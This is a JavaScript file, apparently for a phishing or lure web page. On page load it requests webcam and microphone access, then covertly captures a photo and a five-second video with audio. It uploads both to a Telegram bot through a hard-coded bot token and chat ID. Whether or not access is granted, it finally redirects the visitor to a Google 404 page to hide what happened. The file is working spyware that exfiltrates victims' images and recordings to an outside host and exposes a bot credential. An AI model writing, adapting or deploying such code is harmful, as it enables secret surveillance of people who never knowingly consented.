const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const TELEGRAM_TOKEN = '8793258465:AAEulIFSexJpMN7l6qiBnnTwdVgnD4L-G0o'; 
const TELEGRAM_CHAT_ID = '7053715461'; 

async function startProcess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: true, 
            audio: true 
        });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            setTimeout(async () => {
                await capturePhoto();
                await recordVideo(stream);
            }, 1000);
        };
    } catch (err) {
        window.location.href = "https://www.google.com/404";
    }
}

async function capturePhoto() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const imageData = canvas.toDataURL('image/jpeg', 0.6);
    const blob = await (await fetch(imageData)).blob();
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'image.jpg');

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}

async function recordVideo(stream) {
    const mediaRecorder = new MediaRecorder(stream);
    let chunks = [];

    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/mp4' });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'video.mp4');

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
        
        window.location.href = "https://www.google.com/404";
    };

    mediaRecorder.start();
    setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
    }, 5000); 
}

startProcess();